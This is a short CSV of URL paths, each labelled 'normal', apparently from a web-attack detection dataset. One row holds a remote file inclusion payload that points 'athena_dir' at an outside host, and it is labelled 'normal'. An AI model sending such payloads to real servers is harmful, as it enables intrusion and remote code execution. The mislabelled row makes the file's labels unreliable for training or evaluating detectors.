payload,type
/javascript/samba.cfm,normal
/25576164/,normal
/jdhouse4/,normal
/ad20060110/,normal
/carnivore3/,normal
/melisa/,normal
/122588/,normal
/1909140971/,normal
/idstat/,normal
/holystic/,normal
/javascript/logging.test,normal
/6580628/,normal
/iw_sign/,normal
/javascript/icons.old,normal
/dl78265/,normal
/admin/images/notify_critical.png,normal
/fidc7512efb570616853564b98937efa5f1fc284fa0/,normal
/athena.php?athena_dir=http://192.168.202.118:8080/moclyxlwqyfjnp?,normal
/phones4life/,normal
/compactflash/,normal
/page_039327/,normal
/greenbutton_right/,normal
/5187-3560/,normal
/129867/,normal
/backissues/,normal
/prisonandjails/,normal
/javascript/javascript.nsf,normal
/skidor - absence/,normal
/20030130-10/,normal
/zoomin/,normal
/a24921-2005feb14/,normal
/msg326478/,normal
/pescatore/,normal
/javascript/porn.py,normal
/configsortorder/,normal
/browse_anime/,normal
/georgetown/,normal
/perlmodlib/,normal
/4clejpt/,normal
/fushion_cash/,normal
/order_ethics/,normal
/126006/,normal
/117174/,normal
/011c317/,normal
